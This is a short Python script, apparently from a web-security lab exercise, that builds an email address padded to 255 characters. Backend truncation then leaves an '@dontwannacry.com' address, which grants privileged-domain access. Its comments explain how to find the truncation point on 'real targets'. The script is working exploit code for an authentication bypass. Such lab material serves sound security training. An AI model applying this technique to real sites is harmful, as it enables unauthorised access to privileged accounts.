# NOTE: 255 is NOT a universal truncation limit — it's this lab's specific
# backend behavior (common because 2^8-1 / legacy VARCHAR(255) convention).
# Real targets may truncate at a different length, or not at all, or at
# different lengths in different fields (registration vs access-check vs
# display). Confirm the real cutoff on-target before trusting this number —
# see README logic: register with a huge dummy string first, check where
# it got cut via My Account / password reset / any echo-back point.
domain_suffix = "exploit-0a3200230339e43c8152158901db005c.exploit-server.net"
prefix = f"@dontwannacry.com."
fixed_part = prefix + domain_suffix
padding_len = 255 - len(fixed_part)
padding = "a" * padding_len
email = padding + fixed_part
print(email)
print(f"Length up to '.com': {padding_len + 17}")
print(f"Total length: {len(email)}")
